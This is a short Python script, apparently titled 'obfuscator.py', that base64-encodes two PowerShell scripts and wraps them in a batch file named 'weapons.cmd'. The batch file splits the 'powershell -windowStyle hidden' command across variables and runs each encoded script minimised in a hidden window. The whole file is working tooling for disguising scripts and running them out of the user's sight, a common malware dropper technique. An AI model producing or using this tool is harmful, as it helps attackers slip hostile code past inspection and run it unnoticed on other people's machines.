import sys
import base64
import shutil

def base64_encode(file_path):
    with open(file_path, 'r', encoding='utf-8') as file:
        file_content = file.read()

    file_content = file_content.replace('\n', '\r\n')
    utf16le_bytes = file_content.encode('utf-16le')
    
    encoded_content = base64.b64encode(utf16le_bytes).decode('utf-8')
    return encoded_content

def generate_cmd(xps1_encoded, xps2_encoded, output_file):
    with open(output_file, 'w', encoding='utf-8') as outfile:
        outfile.write(f'@echo off\nset xwp0=powershell\nset xwp1=-windowStyle\nset xwp2=hidden\n')
        outfile.write(f'set xps1="{xps1_encoded}"\n')
        outfile.write(f'cmd /c start /min "" %xwp0% %xwp1% %xwp2% -c (%xwp0% %xwp1% %xwp2% -enC ($env:xps1))\n')
        outfile.write(f'set xps2="{xps2_encoded}"\n')
        outfile.write(f'cmd /c start /min "" %xwp0% %xwp1% %xwp2% -c (%xwp0% %xwp1% %xwp2% -enC ($env:xps2))')

def main():
    if len(sys.argv) != 3:
        print("Usage: python obfuscator.py <script1> <script2>")
        sys.exit(1)

    xps1 = sys.argv[1]
    xps2 = sys.argv[2]

    xps1_encoded = base64_encode(xps1)
    xps2_encoded = base64_encode(xps2)

    generate_cmd(xps1_encoded, xps2_encoded, 'weapons.cmd')

    shutil.copy('weapons.cmd', 'obfuscated_weapons.cmd')

if __name__ == "__main__":
    main()
